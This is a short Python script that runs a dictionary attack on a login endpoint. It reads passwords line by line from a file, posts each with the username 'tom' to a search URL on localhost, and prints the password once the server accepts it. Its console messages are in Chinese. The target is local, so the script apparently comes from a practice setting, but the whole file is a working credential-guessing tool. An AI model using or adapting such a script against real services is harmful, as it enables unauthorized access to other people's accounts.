import requests
import json
import time

isFound = False
fp = open('password.txt', 'r')
lines = fp.readlines()
for line in lines:
    url = 'http://127.0.0.1:8080/search'
    d = {'username': 'tom', 'password': line.strip("\n")}
    r = requests.post(url, data = d)

    resp = json.loads(r.text)
    print(resp)
    if resp['code'] == 0:
        print("密码为", line)
        isFound = True
        break
    print("错误密码", line)
    time.sleep(0.1)
if isFound == False:
    print("找不到相应密码")
